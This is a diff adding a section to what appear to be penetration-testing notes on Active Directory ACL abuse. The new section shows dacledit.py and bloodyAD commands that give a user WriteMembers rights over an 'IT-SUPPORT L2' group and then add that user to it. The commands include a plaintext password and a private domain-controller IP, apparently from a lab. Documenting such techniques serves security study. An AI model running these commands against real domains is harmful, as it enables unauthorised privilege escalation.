@@ -17,6 +17,29 @@ Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -
 ```
 {% endcode %}
 
+### WriteDacl over Group
+
+
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+We grant full control over the group
+
+{% code overflow="wrap" %}
+```bash
+dacledit.py -action 'write' -rights 'WriteMembers' -principal 'bollea.lee' -target-dn 'CN=IT-SUPPORT L2,CN=USERS,DC=GRANDSTAY,DC=LOCAL' 'grandstay.local/bollea.lee':'sweetleehan' -dc-ip 192.168.178.187
+
+```
+{% endcode %}
+
+We add ourselves to the group
+
+{% code overflow="wrap" %}
+```bash
+bloodyAD -d grandstay.local -u bollea.lee -p 'sweetleehan' --host 192.168.178.187 add groupMember 'IT-SUPPORT L2' bollea.lee     
+```
+{% endcode %}
+
 ### GenericAll
 
 Abuse WriteDACL
